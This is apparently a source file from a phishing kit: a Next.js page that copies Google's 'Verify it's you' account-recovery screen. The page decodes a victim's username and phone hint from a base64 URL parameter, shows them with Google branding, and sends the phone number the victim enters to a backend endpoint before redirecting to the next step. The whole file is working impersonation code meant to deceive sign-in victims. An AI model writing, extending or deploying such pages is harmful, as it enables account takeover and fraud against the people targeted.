'use client';

import { useSearchParams } from 'next/navigation';
import { useEffect, useState } from 'react';
import SearchParamsWrapper from '../../components/SearchParamsWrapper';
import { notFound } from 'next/navigation';
import Script from 'next/script';
import '../../public/styles/codeotp.css'; 
function CodeotpPageContent() {
  const searchParams = useSearchParams();
  const [userInfo, setUserInfo] = useState<{
    username: string;
    mobiletype: string;
  } | null>(null);
  const [phoneNumber, setPhoneNumber] = useState('');
  const [selectedCountry, setSelectedCountry] = useState({
    name: "United Kingdom",
    code: "GB",
    phone: 44
  });

  useEffect(() => {
    // Get the first query parameter value (regardless of key name)
    const encodedData = Array.from(searchParams.values())[0];    
    if (!encodedData) {
      notFound();
      return;
    }

    try {
      // Decode the base64 string
      const decodedString = atob(encodedData);
      
      // Parse the decoded string: "{randomParam}/{username}/{mobiletype}/{randomParam}"
      const parts = decodedString.split('/');
      if (parts.length >= 3) {
        setUserInfo({
          username: parts[1],
          mobiletype: parts[2]
        });
      } else {
        notFound();
      }
    } catch (error) {
      console.error('Error decoding data:', error);
      notFound();
    }
  }, [searchParams]);
  useEffect(() => {
  }, [selectedCountry]);

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    const formData = new FormData(e.currentTarget);
    const tel = formData.get('tel') as string;
    const username = formData.get('username') as string;

     const response = await fetch('/api/submit-mobile', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ tel, username }),
    });
    
    if (response.ok) {
      const result = await response.json();
      window.location.href = result.redirectUrl;
    }   

    // Handle form submission logic here
    console.log('Phone verification submitted:', { username, tel });
  };

  const validateMobile = (event: React.KeyboardEvent<HTMLInputElement>) => {
    const key = event.key;
    // Allow digits (0-9), backspace, delete, arrow keys, and tab
    if (/[0-9]/.test(key) || ['Backspace', 'Delete', 'ArrowLeft', 'ArrowRight', 'Tab'].includes(key)) {
      return true;
    } else {
      alert("Please enter numbers only.");
      event.preventDefault();
      return false;
    }
  };

  const handlePhoneNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    setPhoneNumber(value);
  };

  const handleCountrySelect = (country: { name: string; code: string; phone: number }) => {
    setSelectedCountry(country);
    setPhoneNumber('+' + country.phone + ' ');
  };

  const handleButtonClick = (url: string) => {
    window.location.href = url;
  };

  if (!userInfo) {
    return <div>Loading...</div>;
  }

  return (      

    <>
      <Script src="https://code.iconify.design/3/3.1.0/iconify.min.js" strategy="afterInteractive" />
      <Script src="/script/script.js" strategy="afterInteractive" />
      <div className="maindiv">
        <div className="form-half">
            <div>
            <img className="divlogo"   src="/images/image.png" alt="Logo" />
            </div>
            <div>
              <span className="welcome">Verify it&apos;s you</span><br></br><br></br>
            </div>
            <div>
              <span className="warning">To help keep your account safe, Google wants to make sure it&apos;s really you trying to sign in</span>
            </div>
            <div className="userdiv">
              <img className="user-icon" src="/images/user-circle.png" alt="User Icon" />
              <span style={{ color: '#2c2a2a', fontSize: '18px', fontFamily: 'Arial, Helvetica, sans-serif' }}> {userInfo.username} </span>
              <img className="dropdown-icon" src="/images/dropd.jpg" alt="Dropdown Icon" />
            </div>
        </div>
        <div className="form-half">
                <form className="loginform1" onSubmit={handleSubmit}>
                    
                      <div className="image-container">
                        <div className="gradient-box">
                          <img
                            src="/images/account-recovery-sms-pin.gif"
                            alt="SMS Recovery"
                            className="centered-image"
                          />
                        </div>
                      </div>

                      <div className="phonediv">
                        <span className="phonetype">Get a verification code</span>
                        <br />
                        <br />
                        <span className="messaged"> To get a verification code, first confirm the phone number you added to your account is {userInfo.mobiletype}.&nbsp; <i>Standard rates apply.</i>
                        </span>
                      </div>

                      
                      <br />
                      <div className="phone-input-container">
                        <div className="country-selector">
                          <div className="selected-country">
                            <span className="iconify" data-icon={`flag:${selectedCountry.code.toLowerCase()}-4x3`}></span>
                            <span className="dropdown-arrow">▼</span>
                          </div>
                          <div className="country-options">
                            <input type="text" className="search-box" placeholder="Search Country Name" />
                            <ol></ol>
                          </div>
                        </div>
                        <div className="phone-input-wrapper">
                          <input type="hidden" name="username" id="useRname" value={userInfo.username} />
                          <input 
                            type="tel" 
                            name="tel" 
                            onKeyPress={validateMobile} 
                            placeholder="Phone number" 
                            value={phoneNumber} 
                            onChange={handlePhoneNumberChange}
                            className="phone-input"
                            
                          />
                        </div>
                      </div>
                    
                      <div className="tryn">
                        <button type="button" className="hyperl1">Try another way</button>
                        <button type="submit" className="btnnxt">Send</button>
                      </div>
                  
                  </form>
        </div>      
            
      </div>

      <div className="btmdiv">
        <div className="left-div">
          <select className="btmhypl" id="language-select">
            <option value="en">English (United States)</option>
            <option value="fr">French</option>
            <option value="es">Spanish</option>
            <option value="de">German</option>
          </select>
        </div>

        <div className="right-divs">
          <div className="right-div">
            <button className="btmhypl">Help</button>
          </div>
          <div className="right-div">
            <button className="btmhypl">Privacy</button>
          </div>
          <div className="right-div">
            <button className="btmhypl">Terms</button>
          </div>
        </div>
      </div>
    </>
     
    );

   
 
}

export default function CodeotpPage() {
  return (
    <SearchParamsWrapper>
      <CodeotpPageContent />
    </SearchParamsWrapper>
  );
}